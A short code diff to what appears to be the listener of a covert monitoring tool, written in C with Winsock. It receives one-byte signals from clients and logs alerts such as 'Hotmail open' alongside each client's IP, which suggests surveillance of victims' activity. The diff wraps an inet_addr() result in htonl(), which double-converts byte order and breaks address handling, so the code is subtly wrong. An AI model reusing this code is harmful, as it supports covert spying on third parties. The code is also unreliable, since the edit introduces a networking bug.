@@ -70,7 +70,7 @@ if (!he)
   for(i = 0; addr_list[i] != NULL; i++) { //cycle thru possible hosts
          printf("[i]Host Found:%s ", inet_ntoa(*addr_list[i]));
          //addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
-        addr.sin_addr.S_un.S_addr = inet_addr(inet_ntoa(*addr_list[i])); //SET OUR FUCKING IP TO RESOLVED DNS !
+        addr.sin_addr.S_un.S_addr = htonl(inet_addr(inet_ntoa(*addr_list[i]))); //SET OUR FUCKING IP TO RESOLVED DNS !
          break;
     }
   }
@@ -157,7 +157,7 @@ char *ip = inet_ntoa(client_info.sin_addr);
 
 //____________MAIN RECEIVE LOOP
  while(recv(Client,databuffer,200,0) != SOCKET_ERROR){ //While the client is still connected
-    if(*databuffer == '0') printf("[!]Hotmail open on  \t ID:%d \t  IP:%s\n\n" , GetCurrentThreadId(),ip);
+    if(*databuffer == '0') printf("[!]Hotmail open on  \t ID:%d \t  IP:%s\n\n" , GetCurrentThreadId(),ip); //Window open command 0 received
     if(*databuffer == '*') printf("[i]Ping from \t ID:%d \t  IP:%s\n" , GetCurrentThreadId(),ip); //Ping command * received
      //
 
